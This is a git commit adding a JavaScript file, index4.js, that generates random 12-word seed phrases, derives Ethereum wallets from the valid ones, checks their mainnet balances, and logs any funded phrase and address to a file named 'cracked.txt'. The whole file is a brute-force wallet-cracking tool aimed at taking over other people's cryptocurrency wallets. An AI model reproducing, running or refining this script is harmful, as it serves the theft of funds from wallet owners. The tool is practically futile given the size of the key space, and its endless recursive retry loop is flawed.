4204ede6bb180fa6a1d71c00f603623b18053b4f
rizaltjr <79238915+rizaltjr@users.noreply.github.com>
2023-11-21 17:19:26 +0700

    Create index4.js

---
+++ index4.js
@@ -0,0 +1,95 @@
+import { words } from './wordList.js';
+
+import { ethers } from "ethers";
+
+import * as fs from 'fs/promises';
+
+
+
+const provider = new ethers.getDefaultProvider("homestead", {
+
+    etherscan: process.env.API_KEY
+
+});
+
+
+
+async function genSeedPhrase() {
+
+    let seedPhrase = [];
+
+    for (let i = 0; i < 12; i++) {
+
+        let number = Math.floor(Math.random() * 2048);
+
+        seedPhrase.push(words[number]);
+
+    }
+
+
+
+    return seedPhrase.join(' ');
+
+}
+
+
+
+async function main() {
+
+    let phrase = await genSeedPhrase();
+
+    let isValid = ethers.utils.isValidMnemonic(phrase);
+
+
+
+    if (isValid) {
+
+        let walletMnemonic = ethers.Wallet.fromMnemonic(phrase);
+
+        let wallet = walletMnemonic.connect(provider);
+
+        let balance = await wallet.getBalance();
+
+
+
+        console.log(`Valid Seed Phrase:\n${phrase}`);
+
+        console.log("Address: " + wallet.address + "\nBalance: " + balance + " ETH\n\n");
+
+
+
+        if (balance > 0) {
+
+            try {
+
+                await fs.appendFile('cracked.txt', `${phrase}\n${wallet.address}\n`);
+
+                console.log("Seed phrase and address written to cracked.txt");
+
+            } catch (err) {
+
+                console.error("Error writing to cracked.txt:", err);
+
+            }
+
+            return;
+
+        }else{
+          await fs.appendFile('kosong.txt', `${phrase}\n${wallet.address}\n`);
+        }
+
+
+
+        return main(); // Recursive call to continue the process
+
+    } else {
+
+        return main(); // Retry if the generated seed phrase is not valid
+
+    }
+
+}
+
+
+
+main();
